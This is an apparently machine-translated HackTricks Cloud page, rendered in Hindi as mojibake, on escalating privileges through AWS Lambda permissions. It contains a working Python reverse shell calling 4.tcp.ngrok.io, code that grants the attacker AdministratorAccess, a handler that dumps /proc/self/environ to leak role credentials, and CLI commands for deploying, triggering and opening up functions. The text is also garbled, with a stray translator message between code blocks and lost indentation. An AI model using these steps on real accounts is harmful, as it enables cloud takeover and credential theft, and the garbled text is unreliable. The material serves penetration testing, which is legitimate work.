# AWS - Lambda Privesc

<details>

<summary><strong>рд╢реВрдиреНрдп рд╕реЗ рд▓реЗрдХрд░ рд╣реАрд░реЛ рддрдХ AWS рд╣реИрдХрд┐рдВрдЧ рд╕реАрдЦреЗрдВ</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

HackTricks рдХрд╛ рд╕рдорд░реНрдерди рдХрд░рдиреЗ рдХреЗ рдЕрдиреНрдп рддрд░реАрдХреЗ:

* рдпрджрд┐ рдЖрдк рдЪрд╛рд╣рддреЗ рд╣реИрдВ рдХрд┐ рдЖрдкрдХреА **рдХрдВрдкрдиреА рдХрд╛ рд╡рд┐рдЬреНрдЮрд╛рдкрди HackTricks рдореЗрдВ рджрд┐рдЦрд╛рдИ рджреЗ** рдпрд╛ **HackTricks рдХреЛ PDF рдореЗрдВ рдбрд╛рдЙрдирд▓реЛрдб рдХрд░реЗрдВ**, рддреЛ [**рд╕рдмреНрд╕рдХреНрд░рд┐рдкреНрд╢рди рдкреНрд▓рд╛рдиреНрд╕**](https://github.com/sponsors/carlospolop) рджреЗрдЦреЗрдВ!
* [**рдЖрдзрд┐рдХрд╛рд░рд┐рдХ PEASS & HackTricks рд╕реНрд╡реИрдЧ**](https://peass.creator-spring.com) рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) рдХреА рдЦреЛрдЬ рдХрд░реЗрдВ, рд╣рдорд╛рд░рд╛ рд╡рд┐рд╢реЗрд╖ [**NFTs**](https://opensea.io/collection/the-peass-family) рд╕рдВрдЧреНрд░рд╣
* ЁЯТм [**Discord рд╕рдореВрд╣**](https://discord.gg/hRep4RUj7f) рдореЗрдВ **рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ** рдпрд╛ [**telegram рд╕рдореВрд╣**](https://t.me/peass) рдореЗрдВ рдпрд╛ **Twitter** рдкрд░ ЁЯРж [**@carlospolopm**](https://twitter.com/carlospolopm) рдХреЛ **рдлреЙрд▓реЛ** рдХрд░реЗрдВред
* [**HackTricks**](https://github.com/carlospolop/hacktricks) рдФрд░ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos рдореЗрдВ PRs рд╕рдмрдорд┐рдЯ рдХрд░рдХреЗ рдЕрдкрдиреА рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рд╕рд╛рдЭрд╛ рдХрд░реЗрдВред

</details>

## lambda

lambda рдХреЗ рдмрд╛рд░реЗ рдореЗрдВ рдЕрдзрд┐рдХ рдЬрд╛рдирдХрд╛рд░реА рдХреЗ рд▓рд┐рдП:

{% content-ref url="../../aws-security/aws-services/aws-lambda-enum.md" %}
[aws-lambda-enum.md](../../aws-security/aws-services/aws-lambda-enum.md)
{% endcontent-ref %}

### `iam:PassRole`, `lambda:CreateFunction`, (`lambda:InvokeFunction` | `lambda:InvokeFunctionUrl`)

**`iam:PassRole`, `lambda:CreateFunction`,** рдФрд░ **`lambda:InvokeFunction`** рдЕрдиреБрдорддрд┐рдпреЛрдВ рд╡рд╛рд▓рд╛ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ **рдирдП Lambda рдлрд╝рдВрдХреНрд╢рди рдХреЛ рдореМрдЬреВрджрд╛ IAM рд░реЛрд▓ рдкрд╛рд╕ рдХрд░рдХреЗ рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░ рдмрдврд╝рд╛ рд╕рдХрддрд╛ рд╣реИ** рдЬрд┐рд╕рдореЗрдВ рдЙрдирдХреА рдкрд╕рдВрдж рдХреА рдкреНрд░реЛрдЧреНрд░рд╛рдорд┐рдВрдЧ рднрд╛рд╖рд╛ рдХреЗ рд▓рд┐рдП рдкреНрд░рд╛рд╕рдВрдЧрд┐рдХ AWS рд▓рд╛рдЗрдмреНрд░реЗрд░реА рдХреЛ рдЖрдпрд╛рдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдХреЛрдб рд╢рд╛рдорд┐рд▓ рд╣реЛрддрд╛ рд╣реИ, рдлрд┐рд░ рдЙрд╕рдХрд╛ рдЙрдкрдпреЛрдЧ рдЙрдирдХреА рдкрд╕рдВрдж рдХреА рдХреНрд░рд┐рдпрд╛рдПрдВ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред рдХреЛрдб рдХреЛ AWS API рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдлрд╝рдВрдХреНрд╢рди рдХреЛ рдЗрдиреНрд╡реЛрдХ рдХрд░рдХреЗ рдЪрд▓рд╛рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред

рдПрдХ рд╣рдорд▓рд╛рд╡рд░ рдЗрд╕рдХрд╛ рджреБрд░реБрдкрдпреЛрдЧ рдХрд░рдХреЗ **rev shell рдкреНрд░рд╛рдкреНрдд рдХрд░ рд╕рдХрддрд╛ рд╣реИ рдФрд░ рдЯреЛрдХрди рдЪреБрд░рд╛ рд╕рдХрддрд╛ рд╣реИ**:

{% code title="rev.py" %}
```python
import socket,subprocess,os,time
def lambda_handler(event, context):
s = socket.socket(socket.AF_INET,socket.SOCK_STREAM);
s.connect(('4.tcp.ngrok.io',14305))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
p=subprocess.call(['/bin/sh','-i'])
time.sleep(900)
return 0
```
Since the provided text does not contain any content to translate, there is no translation to provide. The markdown syntax given is already at its most concise form. If you have any specific content that needs translation, please provide the text.
```bash
# Zip the rev shell
zip "rev.zip" "rev.py"

# Create the function
aws lambda create-function --function-name my_function \
--runtime python3.9 --role <arn_of_lambda_role> \
--handler rev.lambda_handler --zip-file fileb://rev.zip

# Invoke the function
aws lambda invoke --function-name my_function output.txt
## If you have the lambda:InvokeFunctionUrl permission you need to expose the lambda inan URL and execute it via the URL

# List roles
aws iam list-attached-user-policies --user-name <user-name>
```
рдЖрдк **lambda role рдХреА рдЕрдиреБрдорддрд┐рдпреЛрдВ рдХрд╛ рджреБрд░реБрдкрдпреЛрдЧ** lambda function рд╕реЗ рд╕реНрд╡рдпрдВ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред\
рдпрджрд┐ lambda role рдХреЗ рдкрд╛рд╕ рдкрд░реНрдпрд╛рдкреНрдд рдЕрдиреБрдорддрд┐рдпрд╛рдВ рд╣реЛрдВ, рддреЛ рдЖрдк рдЗрд╕рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдЦреБрдж рдХреЛ admin рдЕрдзрд┐рдХрд╛рд░ рджреЗ рд╕рдХрддреЗ рд╣реИрдВ:
```python
import boto3
def lambda_handler(event, context):
client = boto3.client('iam')
response = client.attach_user_policy(
UserName='my_username',
PolicyArn='arn:aws:iam::aws:policy/AdministratorAccess'
)
return response
```
рд▓реИрдореНрдмреНрдбрд╛ рдХреА рднреВрдорд┐рдХрд╛ рдХреА рд╕рд╛рдЦ рдХреЛ рдмрд┐рдирд╛ рдХрд┐рд╕реА рдмрд╛рд╣рд░реА рдХрдиреЗрдХреНрд╢рди рдХреЗ рд▓реАрдХ рдХрд░рдирд╛ рднреА рд╕рдВрднрд╡ рд╣реИред рдпрд╣ **рдиреЗрдЯрд╡рд░реНрдХ рдкреГрдердХ рд▓реИрдореНрдмреНрдбрд╛рд╕** рдХреЗ рд▓рд┐рдП рдЙрдкрдпреЛрдЧреА рд╣реЛрдЧрд╛ рдЬрд┐рдирдХрд╛ рдЙрдкрдпреЛрдЧ рдЖрдВрддрд░рд┐рдХ рдХрд╛рд░реНрдпреЛрдВ рдХреЗ рд▓рд┐рдП рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред рдпрджрд┐ рдЖрдкрдХреЗ рд░рд┐рд╡рд░реНрд╕ рд╢реЗрд▓реНрд╕ рдХреЛ рдЕрдЬреНрдЮрд╛рдд рд╕реБрд░рдХреНрд╖рд╛ рд╕рдореВрд╣ рдлрд╝рд┐рд▓реНрдЯрд░ рдХрд░ рд░рд╣реЗ рд╣реИрдВ, рддреЛ рдпрд╣ рдХреЛрдб рдЖрдкрдХреЛ рд╕реАрдзреЗ рд▓реИрдореНрдмреНрдбрд╛ рдХреЗ рдЖрдЙрдЯрдкреБрдЯ рдХреЗ рд░реВрдк рдореЗрдВ рд╕рд╛рдЦ рдХреЛ рд▓реАрдХ рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрдЧрд╛ред
```python 
def handler(event, context):
sessiontoken = open('/proc/self/environ', "r").read()
return {
'statusCode': 200,
'session': str(sessiontoken)
}
```

```
aws lambda invoke --function-name <lambda_name> output.txt
cat output.txt
```
**рд╕рдВрднрд╛рд╡рд┐рдд рдкреНрд░рднрд╛рд╡:** рдирд┐рд░реНрджрд┐рд╖реНрдЯ рд▓реИрдореНрдмреНрдбрд╛ рд╕реЗрд╡рд╛ рднреВрдорд┐рдХрд╛ рдХреЗ рд▓рд┐рдП рд╕реАрдзрд╛ рдкреНрд░рд┐рд╡реЗрд╕реНрдХ.

{% hint style="danger" %}
рдзреНрдпрд╛рди рджреЗрдВ рдХрд┐ рднрд▓реЗ рд╣реА **`lambda:InvokeAsync`** рджрд┐рд▓рдЪрд╕реНрдк рд▓рдЧ рд╕рдХрддрд╛ рд╣реИ, рдпрд╣ рдЕрдХреЗрд▓реЗ **`aws lambda invoke-async`** рдХреЛ **рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рдирд╣реАрдВ рджреЗрддрд╛**, рдЖрдкрдХреЛ `lambda:InvokeFunction` рдХреА рднреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реИ
{% endhint %}

### `iam:PassRole`, `lambda:CreateFunction`, `lambda:AddPermission`

рдкрд┐рдЫрд▓реЗ рдкрд░рд┐рджреГрд╢реНрдп рдХреА рддрд░рд╣, рдпрджрд┐ рдЖрдкрдХреЗ рдкрд╛рд╕ **`lambda:AddPermission`** рдЕрдиреБрдорддрд┐ рд╣реИ, рддреЛ рдЖрдк рдЦреБрдж рдХреЛ **`lambda:InvokeFunction`** рдЕрдиреБрдорддрд┐ **рдкреНрд░рджрд╛рди рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ**
```bash
# Check the previous exploit and use the following line to grant you the invoke permissions
aws --profile "$NON_PRIV_PROFILE_USER" lambda add-permission --function-name my_function \
--action lambda:InvokeFunction --statement-id statement_privesc --principal "$NON_PRIV_PROFILE_USER_ARN"
```
**рд╕рдВрднрд╛рд╡рд┐рдд рдкреНрд░рднрд╛рд╡:** рдирд┐рд░реНрджрд┐рд╖реНрдЯ рд▓реИрдореНрдмреНрдбрд╛ рд╕реЗрд╡рд╛ рднреВрдорд┐рдХрд╛ рдХреЗ рд▓рд┐рдП рд╕реАрдзрд╛ рдкреНрд░рд┐рд╡реЗрд╕реНрдХ.

### `iam:PassRole`, `lambda:CreateFunction`, `lambda:CreateEventSourceMapping`

рдЬрд┐рди рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛рдУрдВ рдХреЗ рдкрд╛рд╕ **`iam:PassRole`, `lambda:CreateFunction`, рдФрд░ `lambda:CreateEventSourceMapping`** (рдФрд░ рд╕рдВрднрд╡рддрдГ `dynamodb:PutItem` рдФрд░ `dynamodb:CreateTable`) рдЕрдиреБрдорддрд┐рдпрд╛рдВ рд╣реИрдВ, рд▓реЗрдХрд┐рди `lambda:InvokeFunction` рдЕрдиреБрдорддрд┐ **рдирд╣реАрдВ** рд╣реИ, рд╡реЗ рдЕрдзрд┐рдХрд╛рд░ рдкреНрд░рд╛рдкреНрдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ **рдПрдХ рдореМрдЬреВрджрд╛ IAM рднреВрдорд┐рдХрд╛ рдХреЛ рдПрдХ рдирдП рд▓реИрдореНрдмреНрдбрд╛ рдлрд╝рдВрдХреНрд╢рди рдореЗрдВ рдкрд╛рд╕ рдХрд░рдХреЗ** рдЬрд┐рд╕рдореЗрдВ рдЙрдирдХреА рдкрд╕рдВрдж рдХреА рдкреНрд░реЛрдЧреНрд░рд╛рдорд┐рдВрдЧ рднрд╛рд╖рд╛ рдХреЗ рд▓рд┐рдП рдкреНрд░рд╛рд╕рдВрдЧрд┐рдХ AWS рд▓рд╛рдЗрдмреНрд░реЗрд░реА рдХреЛ рдЖрдпрд╛рдд рдХрд░рдиреЗ рдХрд╛ рдХреЛрдб рд╢рд╛рдорд┐рд▓ рд╣реИ, рдлрд┐рд░ рдЙрд╕рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдЕрдкрдиреА рдкрд╕рдВрдж рдХреА рдХреНрд░рд┐рдпрд╛рдПрдВ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдПред рдлрд┐рд░ рдЙрдиреНрд╣реЗрдВ рдпрд╛ рддреЛ **рдПрдХ DynamoDB рддрд╛рд▓рд┐рдХрд╛ рдмрдирд╛рдиреЗ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реЛрдЧреА рдпрд╛ рдПрдХ рдореМрдЬреВрджрд╛ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдирд╛ рд╣реЛрдЧрд╛**, рддрд╛рдХрд┐ **рд▓реИрдореНрдмреНрдбрд╛ рдлрд╝рдВрдХреНрд╢рди рдХреЗ рд▓рд┐рдП рдЙрд╕ DynamoDB рддрд╛рд▓рд┐рдХрд╛ рдХреА рдУрд░ рдПрдХ рдЗрд╡реЗрдВрдЯ рд╕реЛрд░реНрд╕ рдореИрдкрд┐рдВрдЧ рдмрдирд╛рдИ рдЬрд╛ рд╕рдХреЗ**ред рдлрд┐рд░ рдЙрдиреНрд╣реЗрдВ рдпрд╛ рддреЛ рддрд╛рд▓рд┐рдХрд╛ рдореЗрдВ рдПрдХ рдЖрдЗрдЯрдо рдбрд╛рд▓рдиреЗ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реЛрдЧреА рдпрд╛ рдХрд┐рд╕реА рдЕрдиреНрдп рд╡рд┐рдзрд┐ рдХрд╛ рдЗрдВрддрдЬрд╛рд░ рдХрд░рдирд╛ рд╣реЛрдЧрд╛ рддрд╛рдХрд┐ **рд▓реИрдореНрдмреНрдбрд╛ рдлрд╝рдВрдХреНрд╢рди рдХреЛ рдЖрдордВрддреНрд░рд┐рдд рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХреЗ**ред
```bash
aws lambda create-function --function-name my_function \
--runtime python3.8 --role <arn_of_lambda_role> \
--handler lambda_function.lambda_handler \
--zip-file fileb://rev.zip
```
рдЬрд╣рд╛рдВ рдкрд╛рдпрдерди рдлрд╛рдЗрд▓ рдореЗрдВ **рдХреЛрдб** **рд▓рдХреНрд╖рд┐рдд рднреВрдорд┐рдХрд╛ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░реЗрдЧрд╛**ред рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП рдкрд┐рдЫрд▓реА рд╡рд┐рдзрд┐ рдореЗрдВ рдкреНрд░рдпреБрдХреНрдд рд╕рдорд╛рди рд╕реНрдХреНрд░рд┐рдкреНрдЯ рд╣реЛрдЧреАред

рдЗрд╕рдХреЗ рдмрд╛рдж, рдЕрдЧрд▓рд╛ рдХрджрдо **рдпрд╣ рдирд┐рд░реНрднрд░ рдХрд░рддрд╛ рд╣реИ рдХрд┐ рдХреНрдпрд╛ DynamoDB рдХрд╛ рдЙрдкрдпреЛрдЧ** рд╡рд░реНрддрдорд╛рди AWS рдкрд░реНрдпрд╛рд╡рд░рдг рдореЗрдВ рдХрд┐рдпрд╛ рдЬрд╛ рд░рд╣рд╛ рд╣реИред **рдпрджрд┐** рдЗрд╕рдХрд╛ **рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛ рд░рд╣рд╛ рд╣реИ**, рддреЛ рд╕рднреА рдЬреЛ рдХрд░рдиреЗ рдХреА рдЬрд░реВрд░рдд рд╣реИ рд╡рд╣ рд╣реИ **рд▓реИрдореНрдмреНрдбрд╛ рдлрдВрдХреНрд╢рди рдХреЗ рд▓рд┐рдП рдЗрд╡реЗрдВрдЯ рд╕реЛрд░реНрд╕ рдореИрдкрд┐рдВрдЧ рдмрдирд╛рдирд╛**, рд▓реЗрдХрд┐рди рдпрджрд┐ рдирд╣реАрдВ, рддреЛ рд╣рдорд▓рд╛рд╡рд░ рдХреЛ рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдХрдорд╛рдВрдб рдХреЗ рд╕рд╛рде **рд╕реНрдЯреНрд░реАрдорд┐рдВрдЧ рд╕рдХреНрд╖рдо рдХреЗ рд╕рд╛рде рдПрдХ рдЯреЗрдмрд▓ рдмрдирд╛рдиреЗ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реЛрдЧреА**:
```bash
aws dynamodb create-table --table-name my_table \
--attribute-definitions AttributeName=Test,AttributeType=S \
--key-schema AttributeName=Test,KeyType=HASH \
--provisioned-throughput ReadCapacityUnits=5,WriteCapacityUnits=5 \
--stream-specification StreamEnabled=true,StreamViewType=NEW_AND_OLD_IMAGES
```
рдЗрд╕ рдХрдорд╛рдВрдб рдХреЗ рдмрд╛рдж, рд╣рдорд▓рд╛рд╡рд░ **Lambda рдлрдВрдХреНрд╢рди рдФрд░ DynamoDB рдЯреЗрдмрд▓ рдХреЛ рдЬреЛрдбрд╝реЗрдЧрд╛** рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдХрдорд╛рдВрдб рдХреЗ рд╕рд╛рде **рдПрдХ рдЗрд╡реЗрдВрдЯ рд╕реЛрд░реНрд╕ рдореИрдкрд┐рдВрдЧ рдмрдирд╛рдХрд░**:
```bash
aws lambda create-event-source-mapping --function-name my_function \
--event-source-arn <arn_of_dynamodb_table_stream> \
--enabled --starting-position LATEST
```
рдЕрдм рдЬрдмрдХрд┐ Lambda рдлрд╝рдВрдХреНрд╢рди рдФрд░ рд╕реНрдЯреНрд░реАрдо рдЬреБрдбрд╝ рдЪреБрдХреЗ рд╣реИрдВ, рд╣рдорд▓рд╛рд╡рд░ **DynamoDB рд╕реНрдЯреНрд░реАрдо рдХреЛ рдЯреНрд░рд┐рдЧрд░ рдХрд░рдХреЗ Lambda рдлрд╝рдВрдХреНрд╢рди рдХреЛ рдЗрдиреНрд╡реЛрдХ рдХрд░ рд╕рдХрддрд╛ рд╣реИ**ред рдпрд╣ DynamoDB рдЯреЗрдмрд▓ рдореЗрдВ рдПрдХ рдЖрдЗрдЯрдо рдбрд╛рд▓рдХрд░ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ, рдЬреЛ рд╕реНрдЯреНрд░реАрдо рдХреЛ рдЯреНрд░рд┐рдЧрд░ рдХрд░реЗрдЧрд╛, рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдХрдорд╛рдВрдб рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ:
```bash
aws dynamodb put-item --table-name my_table \
--item Test={S="Random string"}
```
рдЗрд╕ рд╕рдордп, Lambda рдлрд╝рдВрдХреНрд╢рди рдХреЛ рдЗрдиреНрд╡реЛрдХ рдХрд┐рдпрд╛ рдЬрд╛рдПрдЧрд╛, рдФрд░ рд╣рдорд▓рд╛рд╡рд░ AWS рдЦрд╛рддреЗ рдХрд╛ рдПрдбрдорд┐рдирд┐рд╕реНрдЯреНрд░реЗрдЯрд░ рдмрди рдЬрд╛рдПрдЧрд╛ред

**рд╕рдВрднрд╛рд╡рд┐рдд рдкреНрд░рднрд╛рд╡:** Lambda рд╕рд░реНрд╡рд┐рд╕ рд░реЛрд▓ рдХреЗ рд▓рд┐рдП рд╕реАрдзрд╛ privesc рдирд┐рд░реНрджрд┐рд╖реНрдЯред

### `lambda:AddPermission`

рдЗрд╕ рдЕрдиреБрдорддрд┐ рдХреЗ рд╕рд╛рде рдПрдХ рд╣рдорд▓рд╛рд╡рд░ **рдЦреБрдж рдХреЛ (рдпрд╛ рджреВрд╕рд░реЛрдВ рдХреЛ) рдХреЛрдИ рднреА рдЕрдиреБрдорддрд┐рдпрд╛рдБ рдкреНрд░рджрд╛рди рдХрд░ рд╕рдХрддрд╛ рд╣реИ** (рдпрд╣ рд╕рдВрд╕рд╛рдзрди рдЖрдзрд╛рд░рд┐рдд рдиреАрддрд┐рдпрд╛рдБ рдЙрддреНрдкрдиреНрди рдХрд░рддрд╛ рд╣реИ рдЬреЛ рд╕рдВрд╕рд╛рдзрди рддрдХ рдкрд╣реБрдБрдЪ рдкреНрд░рджрд╛рди рдХрд░рддреА рд╣реИрдВ):

{% code overflow="wrap" %}
```bash
# Give yourself all permissions (you could specify granular such as lambda:InvokeFunction or lambda:UpdateFunctionCode)
aws lambda add-permission --function-name <func_name> --statement-id asdasd --action '*' --principal arn:<your user arn>

# Invoke the function
aws lambda lambda invoke --function-name <func_name> /tmp/outout
```
{% endcode %}

**рд╕рдВрднрд╛рд╡рд┐рдд рдкреНрд░рднрд╛рд╡:** lambda рд╕реЗрд╡рд╛ рднреВрдорд┐рдХрд╛ рдХреЗ рд▓рд┐рдП рд╕реАрдзреЗ privesc, рдХреЛрдб рдХреЛ рд╕рдВрд╢реЛрдзрд┐рдд рдХрд░рдиреЗ рдФрд░ рдЙрд╕реЗ рдЪрд▓рд╛рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрдХрд░ред

### `lambda:AddLayerVersionPermission`

рдЗрд╕ рдЕрдиреБрдорддрд┐ рдХреЗ рд╕рд╛рде рдПрдХ рд╣рдорд▓рд╛рд╡рд░ **рдЦреБрдж рдХреЛ (рдпрд╛ рджреВрд╕рд░реЛрдВ рдХреЛ) `lambda:GetLayerVersion` рдХреА рдЕрдиреБрдорддрд┐ рджреЗ рд╕рдХрддрд╛ рд╣реИ**ред рд╡рд╣ рдкрд░рдд рддрдХ рдкрд╣реБрдБрдЪ рд╕рдХрддрд╛ рд╣реИ рдФрд░ рдХрдордЬреЛрд░рд┐рдпреЛрдВ рдпрд╛ рд╕рдВрд╡реЗрджрдирд╢реАрд▓ рдЬрд╛рдирдХрд╛рд░реА рдХреА рдЦреЛрдЬ рдХрд░ рд╕рдХрддрд╛ рд╣реИред

{% code overflow="wrap" %}
```bash
# Give everyone the permission lambda:GetLayerVersion
aws lambda add-layer-version-permission --layer-name ExternalBackdoor --statement-id xaccount --version-number 1 --principal '*' --action lambda:GetLayerVersion
```
{% endcode %}

**рд╕рдВрднрд╛рд╡рд┐рдд рдкреНрд░рднрд╛рд╡:** рд╕рдВрд╡реЗрджрдирд╢реАрд▓ рдЬрд╛рдирдХрд╛рд░реА рддрдХ рд╕рдВрднрд╛рд╡рд┐рдд рдкрд╣реБрдБрдЪред

### `lambda:UpdateFunctionCode`

рдПрдХ рд╣рдорд▓рд╛рд╡рд░ рдЬрд┐рд╕рдХреЗ рдкрд╛рд╕ **`lambda:UpdateFunctionCode`** рдЕрдиреБрдорддрд┐ рд╣реЛ, рд╡рд╣ **рдореМрдЬреВрджрд╛ Lambda рдлрд╝рдВрдХреНрд╢рди рдХреЗ рдХреЛрдб рдХреЛ рдЕрдкрдбреЗрдЯ рдХрд░ рд╕рдХрддрд╛ рд╣реИ рдЬрд┐рд╕рд╕реЗ рдЙрд╕рдореЗрдВ рдЬреБрдбрд╝рд╛ IAM рд░реЛрд▓ рд╣реЛ** рддрд╛рдХрд┐ рд╡рд╣ рд╕рдВрдмрдВрдзрд┐рдд AWS рд▓рд╛рдЗрдмреНрд░реЗрд░реА рдХреЛ рдЙрд╕ рдкреНрд░реЛрдЧреНрд░рд╛рдорд┐рдВрдЧ рднрд╛рд╖рд╛ рдореЗрдВ рдЖрдпрд╛рдд рдХрд░реЗ рдФрд░ рдЙрд╕ рд░реЛрд▓ рдХреА рдУрд░ рд╕реЗ рдХрд╛рд░реНрдп рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЙрд╕рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░реЗред рдлрд┐рд░ рдЙрдиреНрд╣реЗрдВ **рдкреНрд░рддреАрдХреНрд╖рд╛ рдХрд░рдиреА рд╣реЛрдЧреА рдЗрд╕рдХреЗ рдЖрд╣реНрд╡рд╛рди рдХреА, рдпрджрд┐ рд╡реЗ рд╕реАрдзреЗ рдРрд╕рд╛ рдХрд░рдиреЗ рдореЗрдВ рд╕рдХреНрд╖рдо рдирд╣реАрдВ рд╣реИрдВ**, рд▓реЗрдХрд┐рди рдЕрдЧрд░ рдпрд╣ рдкрд╣рд▓реЗ рд╕реЗ рдореМрдЬреВрдж рд╣реИ, рддреЛ рд╕рдВрднрд╛рд╡рдирд╛ рд╣реИ рдХрд┐ рдЗрд╕реЗ рдХрд┐рд╕реА рди рдХрд┐рд╕реА рддрд░рд╣ рд╕реЗ рдЖрд╣реНрд╡рд╛рди рдХрд┐рдпрд╛ рдЬрд╛рдПрдЧрд╛ред
```bash
aws lambda update-function-code --function-name target_function \
--zip-file fileb:///my/lambda/code/zipped.zip

# If you have invoke permissions:
aws lambda invoke --function-name my_function output.txt

# If not checki if it's exposed in any URL or via an API gateway you could access
```
### `lambda:UpdateFunctionConfiguration`

#### рдкрд░рд┐рдЪрдп

[**Lambda Layers**](https://docs.aws.amazon.com/lambda/latest/dg/configuration-layers.html) рдЖрдкрдХреЛ рдЕрдкрдиреЗ lambda function рдореЗрдВ **рдХреЛрдб** рд╢рд╛рдорд┐рд▓ рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИ рд▓реЗрдХрд┐рди **рдЗрд╕реЗ рдЕрд▓рдЧ рд╕реЗ рд╕рдВрдЧреНрд░рд╣реАрдд рдХрд░рдХреЗ**, рддрд╛рдХрд┐ function рдХреЛрдб рдЫреЛрдЯрд╛ рд░рд╣ рд╕рдХреЗ рдФрд░ **рдХрдИ functions рдХреЛрдб рдХреЛ рд╕рд╛рдЭрд╛ рдХрд░ рд╕рдХреЗрдВ**ред

Lambda рдХреЗ рдЕрдВрджрд░ рдЖрдк рдпрд╣ рдЬрд╛рдВрдЪ рд╕рдХрддреЗ рд╣реИрдВ рдХрд┐ python рдХреЛрдб рдХрд╣рд╛рдБ рд╕реЗ рд▓реЛрдб рдХрд┐рдпрд╛ рдЬрд╛ рд░рд╣рд╛ рд╣реИ, рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдЬреИрд╕реЗ function рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ:
```python
import json
import sys

def lambda_handler(event, context):
print(json.dumps(sys.path, indent=2))
```
рдпреЗ рд╡реЛ рд╕реНрдерд╛рди рд╣реИрдВ:

1. /var/task
2. /opt/python/lib/python3.7/site-packages
3. /opt/python
4. /var/runtime
5. /var/lang/lib/python37.zip
6. /var/lang/lib/python3.7
7. /var/lang/lib/python3.7/lib-dynload
8. /var/lang/lib/python3.7/site-packages
9. /opt/python/lib/python3.7/site-packages
10. /opt/python

рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП, рд▓рд╛рдЗрдмреНрд░реЗрд░реА boto3 рдХреЛ `/var/runtime/boto3` (4рд╡реЗрдВ рд╕реНрдерд╛рди) рд╕реЗ рд▓реЛрдб рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред

#### рд╢реЛрд╖рдг

**рдПрдХ рдлрдВрдХреНрд╢рди рдореЗрдВ рд▓реЗрдпрд░ рдЬреЛрдбрд╝рдирд╛** рдХреЗрд╡рд▓ `lambda:UpdateFunctionConfiguration` рдЕрдиреБрдорддрд┐ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реЛрддреА рд╣реИ рдФрд░ **рд▓реЗрдпрд░реНрд╕ рдХреЛ рдХреНрд░реЙрд╕-рдЕрдХрд╛рдЙрдВрдЯ рд╕рд╛рдЭрд╛ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ**ред рд╣рдореЗрдВ рдпрд╣ рднреА рдЬрд╛рдирдиреЗ рдХреА рдЬрд░реВрд░рдд рд╣реЛрдЧреА **рдХрд┐ рд╡реЗ рдХреМрди рд╕реА рд▓рд╛рдЗрдмреНрд░реЗрд░реАрдЬ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░ рд░рд╣реЗ рд╣реИрдВ**, рддрд╛рдХрд┐ рд╣рдо рдЙрдиреНрд╣реЗрдВ рд╕рд╣реА рдврдВрдЧ рд╕реЗ рдУрд╡рд░рд░рд╛рдЗрдб рдХрд░ рд╕рдХреЗрдВ, рд▓реЗрдХрд┐рди рдЗрд╕ рдЙрджрд╛рд╣рд░рдг рдореЗрдВ, рд╣рдо рдмрд╕ **рдорд╛рди рд▓реЗрдВрдЧреЗ рдХрд┐ рд╣рдорд▓рд╛ рдХрд┐рдпрд╛ рдЬрд╛ рд░рд╣рд╛ рдлрдВрдХреНрд╢рди boto3 рдХреЛ рдЗрдореНрдкреЛрд░реНрдЯ рдХрд░ рд░рд╣рд╛ рд╣реИ**ред

